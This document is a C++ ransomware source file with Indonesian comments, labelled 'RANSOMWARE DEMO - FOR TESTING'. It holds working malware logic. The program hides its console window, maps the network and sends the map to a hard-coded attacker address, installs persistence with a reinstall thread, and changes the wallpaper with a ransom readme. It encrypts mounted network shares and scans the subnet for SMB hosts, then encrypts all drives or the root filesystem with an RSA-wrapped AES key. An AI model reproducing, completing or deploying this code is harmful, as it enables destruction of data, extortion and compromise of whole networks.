
void encrypt_directory(const std::string& root, const SecByteBlock& key, const byte* iv) {
    std::cout << "[*] Scanning directory: " << root << " (parallel mode)\n";

    std::vector<std::string> files_to_encrypt;
    int total_files = 0;

    // Step 1: Kumpulkan semua file dulu (tidak langsung enkripsi)
    try {
        for (const auto& entry : fs::recursive_directory_iterator(
                root, fs::directory_options::skip_permission_denied)) {

            if (!entry.is_regular_file()) continue;

            std::string path = entry.path().string();
            if (is_critical_path(path)) continue;
            if (should_encrypt(path)) {
                files_to_encrypt.push_back(path);
                total_files++;
            }
        }
    } catch (const std::exception& e) {
        std::cout << "[!] Error scanning " << root << ": " << e.what() << "\n";
    }

    if (files_to_encrypt.empty()) {
        std::cout << "[✓] Tidak ada file yang perlu dienkripsi di " << root << "\n\n";
        return;
    }

    std::cout << "[*] Ditemukan " << total_files << " file → memulai enkripsi PARALLEL...\n";

    // Step 2: Buat Thread Pool (sesuaikan jumlah thread sesuai CPU)
    ThreadPool pool(16);        // 16 thread biasanya paling cepat di kebanyakan mesin

    std::atomic<int> encrypted_count{0};

    // Step 3: Kirim semua tugas ke thread pool
    for (const auto& file : files_to_encrypt) {
        pool.enqueue([&file, &key, iv, &encrypted_count]() {
            encrypt_file(file, key, iv);
            encrypted_count.fetch_add(1, std::memory_order_relaxed);
        });
    }

    // Tunggu semua selesai (ThreadPool destructor otomatis join)
    // Kita bisa tambah progress sederhana kalau mau
    std::cout << "[✓] Semua tugas dikirim ke thread pool. Menunggu selesai...\n";
}


// ====================== LATERAL MOVEMENT ======================
void perform_lateral_movement(const SecByteBlock& key, const byte* iv) {
    std::cout << "[*] Starting lateral movement (mounted shares + network scan)...\n";

    // 1. Enkripsi semua mounted network share (CIFS/NFS/SMB)
    auto shares = get_mounted_network_shares();
    if (!shares.empty()) {
        for (const auto& share : shares) {
            std::cout << "[LATERAL] Encrypting mounted network share: " << share << "\n";
            encrypt_directory(share, key, iv);
        }
    } else {
        std::cout << "[*] No mounted network shares found.\n";
    }

    // 2. Parallel network discovery (SMB port 445)
    std::string subnet = get_local_subnet();
    std::cout << "[*] Scanning subnet " << subnet << ".0/24 for SMB targets (parallel)...\n";

    ThreadPool pool(32);   // gunakan ThreadPool yang sudah ada

    for (int i = 1; i < 255; ++i) {
        std::string ip = subnet + "." + std::to_string(i);
        pool.enqueue([ip]() {
            if (is_port_open(ip, 445)) {
                std::lock_guard<std::mutex> lock(log_mutex);
                std::cout << "[LATERAL] SMB target found → " << ip << " (port 445 open)\n";
                
                // Coba list share (opsional, butuh samba-common-bin)
                std::string cmd = "timeout 3 smbclient -L //" + ip + " -N --max-protocol=SMB2 2>/dev/null || true";
                system(cmd.c_str());
            }
        });
    }

    std::cout << "[✓] Lateral movement scan selesai. Cek console untuk target SMB.\n\n";
}


// ====================== TARGET ROOTS ======================

std::vector<std::string> get_all_roots() {
    std::vector<std::string> roots;
    
    // Untuk testing, gunakan current directory dulu
    
    
    // Nanti bisa di-uncomment untuk full system
   
#ifdef _WIN32
    for (char d = 'C'; d <= 'Z'; ++d) {
        std::string drive = std::string(1, d) + ":\\";
        std::error_code ec;
        if (fs::exists(drive, ec) && !ec) roots.push_back(drive);
    }
#else
    roots.push_back("/");
#endif
   
    return roots;
}

// ====================== ANTI-ANALYSIS ======================

bool should_run() {
    std::cout << "[*] Anti-analysis checks disabled for testing\n";
    return true;
}

// ====================== MAIN ======================

int main() {
    std::cout << "\n========================================\n";
    std::cout << "     RANSOMWARE DEMO - FOR TESTING     \n";
    std::cout << "========================================\n\n";
    
    std::cout << "[DEBUG] Program started\n";
    std::cout << "[DEBUG] Current path: " << fs::current_path() << "\n";
    
    // List files in current directory
    std::cout << "\n[DEBUG] Files in current directory:\n";
    try {
        for (const auto& entry : fs::directory_iterator(".")) {
            std::cout << "    " << entry.path().string() << "\n";
        }
    } catch (const std::exception& e) {
        std::cout << "    Error listing directory: " << e.what() << "\n";
    }
    std::cout << "\n";

    // Hide console window on Windows
#ifdef _WIN32
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);
#endif

    // Anti-analysis checks
    if (!should_run()) {
        std::this_thread::sleep_for(std::chrono::seconds(5));
        return 0;
    }

    // Network mapping
    std::cout << "[*] Starting network mapping...\n";
    {
        NetworkMapper mapper;
        mapper.perform_mapping();
        // Kirim ke domain
        mapper.send_to_attacker("http://192.168.1.2:5000");
        /*mapper.send_to_attacker(); // Kosongin parameter kalo gak pake C2*/
    }
    std::cout << "[✓] Network mapping completed\n\n";

    // Change wallpaper first (immediate visual feedback)
    WallpaperChanger wallpaper;
    wallpaper.change_wallpaper();
    wallpaper.create_readme_file();

    // Initialize persistence
    std::cout << "[*] Initializing persistence manager...\n";
    PersistenceManager persistence;
    
    // Install persistence if not already persistent
    if (!persistence.is_persistent()) {
        persistence.install_all();
        
        // Start persistence monitoring thread
        std::cout << "[*] Starting persistence monitor thread...\n";
        std::thread persistence_thread(&PersistenceManager::check_and_reinstall, &persistence);
        persistence_thread.detach();
    } else {
        std::cout << "[*] Already running from persistent location\n";
    }

    // Check for public key
    std::cout << "[*] Checking for public key: " << PUBLIC_KEY_FILE << "\n";
    if (!fs::exists(PUBLIC_KEY_FILE)) {
        std::cout << "[!] Public key not found!\n";
        std::cout << "[!] Please run generate_keys first\n";
        return 1;
    }
    std::cout << "[✓] Public key found\n";

    // Generate encryption keys
    std::cout << "[*] Generating AES-256 key and IV...\n";
    AutoSeededRandomPool prng;
    SecByteBlock key(32);
    byte iv[AES::BLOCKSIZE];
    
    prng.GenerateBlock(key, key.size());
    prng.GenerateBlock(iv, sizeof(iv));
    std::cout << "[✓] AES key generated (" << key.size() << " bytes)\n";

    // Encrypt AES key with RSA
    std::cout << "[*] Encrypting AES key with RSA public key...\n";
    std::string enc_key;
    rsa_encrypt_aes_key(key, enc_key);
    std::cout << "[✓] AES key encrypted\n";
    perform_lateral_movement(key, iv);

    // Save encrypted key
    std::cout << "[*] Saving encrypted key to: aes_key.enc\n";
    FileSink keyfile("aes_key.enc");
    keyfile.Put(reinterpret_cast<const byte*>(enc_key.data()), enc_key.size());
    std::cout << "[✓] Encrypted key saved\n";

    // Start encryption
    std::cout << "\n[*] Starting encryption process...\n\n";
    auto roots = get_all_roots();
    for (const auto& root : roots) {
        encrypt_directory(root, key, iv);
    }

    // Clean up sensitive data
    memset(key.data(), 0, key.size());
    memset(iv, 0, sizeof(iv));
    
    std::cout << "\n[✓] Program completed successfully\n";
    std::cout << "========================================\n\n";

    return 0;
}
